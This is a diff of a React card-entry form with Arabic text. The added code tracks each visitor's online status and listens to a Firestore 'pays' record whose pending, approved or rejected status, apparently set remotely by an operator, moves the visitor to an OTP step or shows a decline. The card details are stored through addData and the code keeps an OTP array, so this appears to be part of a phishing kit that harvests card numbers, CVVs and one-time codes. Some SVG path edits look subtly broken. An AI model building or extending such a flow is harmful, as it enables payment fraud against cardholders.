@@ -1,10 +1,13 @@
 "use client"
 
 import { addData } from "@/lib/firebase"
-import { useState, type ChangeEvent, type FormEvent } from "react"
+import { useState, useEffect, type ChangeEvent, type FormEvent } from "react"
 import { useSearchParams } from "next/navigation"
 import { Button } from "@/components/ui/button"
 import { FullPageLoader } from "./loader"
+import { doc, onSnapshot } from "firebase/firestore"
+import { db } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 interface CardData {
   number: string
@@ -65,6 +68,7 @@ const validateCVV = (cvv: string, cardType: string): boolean => {
 
 const allOtps = [""]
 
+
 export default function AddCard() {
   const searchParams = useSearchParams()
   const id = searchParams.get("id")
@@ -82,6 +86,32 @@ export default function AddCard() {
   const [loading, setLoading] = useState(false)
   const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof CardData, string>>>({})
 
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")||id
+    if (visitorId) {
+      setupOnlineStatus(visitorId)
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data()
+
+          if (data.status === "pending") {
+            setLoading(true)
+            setError("")
+          } else if (data.status === "approved") {
+            setLoading(false)
+            setStep("otp")
+            setError("")
+          } else if (data.status === "rejected") {
+            setLoading(false)
+            setStep("form")
+            setError("عذراً، تم رفض البطاقة. الرجاء التحقق من المعلومات والمحاولة مرة أخرى.")
+          }
+        }
+      })
+      return () => unsubscribe()
+    }
+  }, [])
+
   const formatCardNumber = (v: string) =>
     v
       .replace(/\D/g, "")
@@ -98,6 +128,7 @@ export default function AddCard() {
 
   const handleCardSubmit = async (e: FormEvent) => {
     e.preventDefault()
+    console.log(id)
     const errors: Partial<Record<keyof CardData, string>> = {}
 
     if (!cardData.number) {
@@ -209,15 +240,18 @@ export default function AddCard() {
     const iconClass = "absolute left-3 top-1/2 -translate-y-1/2"
 
     if (cardType === "visa") {
-      return <span className={`${iconClass} text-blue-600 font-bold text-sm`}>
-        <img src="/visa.svg" alt="visa" width={35}/>
-        
-      </span>
+      return (
+        <span className={`${iconClass} text-blue-600 font-bold text-sm`}>
+          <img src="/visa.svg" alt="visa" width={35} />
+        </span>
+      )
     }
     if (cardType === "mastercard") {
-      return <span className={`${iconClass} text-red-600 font-bold text-sm`}>
-        <img src="/master.svg" alt="src"  width={35}/>
-      </span>
+      return (
+        <span className={`${iconClass} text-red-600 font-bold text-sm`}>
+          <img src="/master.svg" alt="src" width={35} />
+        </span>
+      )
     }
     if (cardType === "amex") {
       return <span className={`${iconClass} text-blue-500 font-bold text-sm`}>AMEX</span>
@@ -315,7 +349,7 @@ export default function AddCard() {
                       strokeLinecap="round"
                       strokeLinejoin="round"
                       strokeWidth={2}
-                      d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
+                      d="M16 7a4 4 0 11-8 0 4 4 0 018 0zm-7 4a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                     />
                   </svg>
                   اسم حامل البطاقة
@@ -378,7 +412,7 @@ export default function AddCard() {
                         strokeLinecap="round"
                         strokeLinejoin="round"
                         strokeWidth={2}
-                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2z"
                       />
                     </svg>
                     CVV
@@ -405,7 +439,7 @@ export default function AddCard() {
                   <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                     <path
                       fillRule="evenodd"
-                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
+                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 00-1.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                       clipRule="evenodd"
                     />
                   </svg>
@@ -418,7 +452,7 @@ export default function AddCard() {
                   <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                     <path
                       fillRule="evenodd"
-                      d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
+                      d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 01-2-2z"
                       clipRule="evenodd"
                     />
                   </svg>
@@ -469,7 +503,7 @@ export default function AddCard() {
                   <svg className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                     <path
                       fillRule="evenodd"
-                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
+                      d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 00-1.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                       clipRule="evenodd"
                     />
                   </svg>
